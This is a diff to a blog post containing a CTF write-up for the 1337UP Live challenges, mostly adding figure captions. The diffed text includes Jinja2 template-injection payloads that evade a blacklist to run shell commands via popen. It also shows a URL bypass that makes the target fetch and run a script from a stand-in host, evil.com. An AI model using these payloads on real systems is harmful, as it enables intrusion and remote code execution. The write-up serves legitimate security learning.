@@ -27,6 +27,7 @@ tags: CTF
 ### **Binomial Ways**
 
 >There is only one way! The binomial way!
+>
 >Created by Shyam Sunder Saravanan
 
 For the first challenge, let's start with some crypto. In this challenge we are
@@ -67,6 +68,7 @@ added to said flag byte and the final value is casted to a new character. The ou
 the program is provided and looks something like the following:
 
 >31
+>
 >27F;VPbAs>clu}={9ln=_o1{0n5tp~
 
 The first line of the output is the flag length and the rest is our ciphertext.
@@ -113,6 +115,7 @@ ciphertext with a single character prepended to it can be decoded for the second
 Therefore, the script outputs the following:
 
 >1337UPUAf>Vlh{(o$ja=Ro${#n4p]z
+>
 >`.$B:VCb4s1c_sh1f7_n0_b1n0m1al}
 
 >1337UP{b4s1c_sh1f7_n0_b1n0m1al}
@@ -122,6 +125,7 @@ Therefore, the script outputs the following:
 ### **Equality**
 
 >Perfectly balanced, as all things should be!
+>
 >Created by Piyush Paliwal
 
 For Equality, we are given two sets of RSA values and are tasked with decoding the
@@ -179,9 +183,12 @@ the ciphertext if possible. After running the script we get the following output
 ### **Quiz**
 
 >Ready for a little quiz?
+>
 >Created by Bruno Halltari and GoatSniff
 
 [![Quiz](/assets/1337UPCTF/quiz2.png)](/assets/1337UPCTF/quiz2.png)
+<figcaption align=center><b>Figure 1.1: Quiz Main Page</b></figcaption>
+&nbsp;
 
 For this challenge we are given a quiz about the 1337UP Live events. The quiz takes the
 form of a web app, each answer we get right is worth 10 points and with 100 points we can
@@ -306,6 +313,8 @@ Once the script finishes we can refresh the page and check if we have enough poi
 we can buy the flag and complete the challenge. If not, we reset our points and try again.
 
 [![Racer Flag](/assets/1337UPCTF/quizflag.png)](/assets/1337UPCTF/quizflag.png)
+<figcaption align=center><b>Figure 1.2: Buying the Flag</b></figcaption>
+&nbsp;
 
 >1337UP{this_is_a_secret_flag}
 
@@ -314,9 +323,12 @@ we can buy the flag and complete the challenge. If not, we reset our points and 
 ### **Dead Tube**
 
 >The new video service coming to you: Dead Tube
+>
 >Created by Bruno Halltari
 
 [![Dead Tube](/assets/1337UPCTF/dead1.png)](/assets/1337UPCTF/dead1.png)
+<figcaption align=center><b>Figure 2.1: Dead Tube Main Page</b></figcaption>
+&nbsp;
 
 Dead Tube is a web challenge based on a web service that previews URLs that
 we submit. For this challenge we are provided a zip file containing the source code
@@ -404,6 +416,7 @@ the secret flag section of the website.
 ### **1 truth, 2 lies**
 
 >This is a lie!
+>
 >Created by ComdeyOverflow
 
 The basic premise of this challenge is determining which sections of code are
@@ -456,34 +469,40 @@ Taking a closer look at segment 2, let's try some template injections strings to
 we can create any strange output.
 
 [![7*7](/assets/1337UPCTF/1truth1.png)](/assets/1337UPCTF/1truth1.png)
+<figcaption align=center><b>Figure 3.1: Successful SSTI Shown in Burp Suite</b></figcaption>
+&nbsp;
 
-When we supply the classic `\{\{7*7\}\}` string to the app, it spits out a the tell-tale 49.
+When we supply the classic `{{7*7}}` string to the app, it spits out a the tell-tale 49.
 So this segment is definitely injectable, but looking closer at it's code, it has a small
 blacklist that complicates things. The app blocks the use of any of the following:
 
->'.', '_', '|join', '[', ']', 'mro', 'base'
+>'.', '_', '\|join', '[', ']', 'mro', 'base'
 
 This makes things a fair bit more complicated. However, with a bit of googling we can
 find a decent bypass for most of these vulnerabilities. Since `attr` is not in the blacklist,
 we can easily bypass the first two filters and access the globals.
 
->{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
+>\{\{request\|attr('application')\|attr('\x5f\x5fglobals\x5f\x5f')\}\}
 
 Now we just need to use these to access some system commands. The easiest way to do this,
 in this case, we can work our way towards popen. Popen will let us create a process and
 read it's output for a lot of common system commands. First, to create a injection to
 list directory contents and get our bearings
 
->{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+>\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()\}\}
 
 
 [![Dir Contents](/assets/1337UPCTF/1truth2.png)](/assets/1337UPCTF/1truth2.png)
+<figcaption align=center><b>Figure 3.2: Directory Contents Listed in Burp Suite</b></figcaption>
+&nbsp;
 
 Next, we just need to read the flag file and the challenge should be complete.
 
->{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat%20flag*')|attr('read')()}}
+>\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat%20flag*')|attr('read')()\}\}
 
 [![Flag](/assets/1337UPCTF/1truth3.png)](/assets/1337UPCTF/1truth3.png)
+<figcaption align=center><b>Figure 3.3: Results of the Final Injection in Burp Suite</b></figcaption>
+&nbsp;
 
 >flag{lea5n_h0w_vuln_h1ppen_and_wh1t_line_m1ke_vuln!!!}
 
@@ -503,6 +522,8 @@ To begin our foray into this lengthy web challenge, we start off with some basic
 interesting tasks. Let's start off by exploring the site a bit.
 
 [![Site Main page](/assets/1337UPCTF/lovelycat.png)](/assets/1337UPCTF/lovelycat.png)
+<figcaption align=center><b>Figure 4.1: Lovely Kitten Pictures Main Page</b></figcaption>
+&nbsp;
 
 The site is fairly simple from an initial look. Cute cat pictures are displayed and
 the user can swap between them by clicking a button. Nothing too exploitable. Perhaps
@@ -576,6 +597,8 @@ Using the data we gathered from cat_info.php we have a path to a cute cat `asset
 When we visit the above URL we get the following output:
 
 [![Cute Cat](/assets/1337UPCTF/lovelycat3.png)](/assets/1337UPCTF/lovelycat3.png)
+<figcaption align=center><b>Figure 4.2: A Cute Cate Picture</b></figcaption>
+&nbsp;
 
 It's just a cute cat but, this means pictures.php is also easily accessible to us.
 Next, let's mess with this function as well and try to include something that isn't
@@ -584,6 +607,8 @@ a cat path. How about the pictures script?
 >https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=pictures.php
 
 [![Download](/assets/1337UPCTF/lovelycatx.png)](/assets/1337UPCTF/lovelycatx.png)
+<figcaption align=center><b>Figure 4.3: Pending Download for pictures.php with an Interesting File Name</b></figcaption>
+&nbsp;
 
 The website lets us download the pictures.php script but the name is a bit interesting.
 It appears to be the first flag of this challenge.
@@ -666,6 +691,8 @@ decompile the program to find hints. I chose to decompile it to see the logic a 
 Either way works just fine though.
 
 [![Main](/assets/1337UPCTF/lovelykitten1.png)](/assets/1337UPCTF/lovelykitten1.png)
+<figcaption align=center><b>Figure 5.1: A Segment From the Decompiled Program</b></figcaption>
+&nbsp;
 
 There are a few strings in main that reveal the flags the program takes. `-c` we have already
 seen but `-h` can also be used to get some help info. Let's see if it works on the site.
@@ -673,6 +700,8 @@ seen but `-h` can also be used to get some help info. Let's see if it works on t
 >https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-h
 
 [![Cat Help](/assets/1337UPCTF/lovelycats.png)](/assets/1337UPCTF/lovelycats.png)
+<figcaption align=center><b>Figure 5.2: Main's Help Menu</b></figcaption>
+&nbsp;
 
 The site responds with the help info for main and gives us more insight into the program flags.
 `-e` is an extremely interesting flag to try out. When `-e` is enabled the program can "perform
@@ -705,6 +734,7 @@ a bit. Given that the `-e` flag takes in a URL, we can potentially try to direct
 to a remote URL hosting our own script.
 
 >https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20http://evil.com/script.sh
+>
 >[*] External requests are not allowed! 🐈
 
 Unfortunately, like the help menu said, requests to external domains are not allowed. Or are they?
@@ -714,6 +744,7 @@ enough to trick the application but still have the URL resolve to `evil.com`. He
 localhost is treated as a username for the evil.com domain.
 
 >https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20http://localhost@evil.com/script.sh
+>
 >[*] Showing results 🐈
 
 Nice! The bypass works! Now we just need to host a script to run on our domain evil.com. First, I chose to
@@ -731,8 +762,10 @@ done
 ```
 
 [![Root Contents](/assets/1337UPCTF/lovelycats2.png)](/assets/1337UPCTF/lovelycats2.png)
+<figcaption align=center><b>Figure 5.3: The Contents of the Root Directory</b></figcaption>
+&nbsp;
 
-**Figure X** shows the results of our script and reveals the second flag's file.
+**Figure 5.3** shows the results of our script and reveals the second flag's file.
 Now that we know where it is, we just have to read the flag. To do this I adjusted the
 script.
 
@@ -756,6 +789,7 @@ reading it isn't required for the next part.
 ### **Part 3**
 
 >A cat is an example of sophistication minus civilization.
+>
 >Created by Breno Vitório
 
 The final part I completed starts right where we left off in part 2. After reading the second flag,
@@ -777,6 +811,8 @@ Using `sudo -l` we can find that our current user (www-data) has permissions to
 we take all the wins we can get.
 
 [![Flag](/assets/1337UPCTF/lovelycats4.png)](/assets/1337UPCTF/lovelycats4.png)
+<figcaption align=center><b>Figure 6.1: Reading the Flag File</b></figcaption>
+&nbsp;
 
 After a bit more exploring with our new access, we can find the third flag inside the
 home directory for level1.
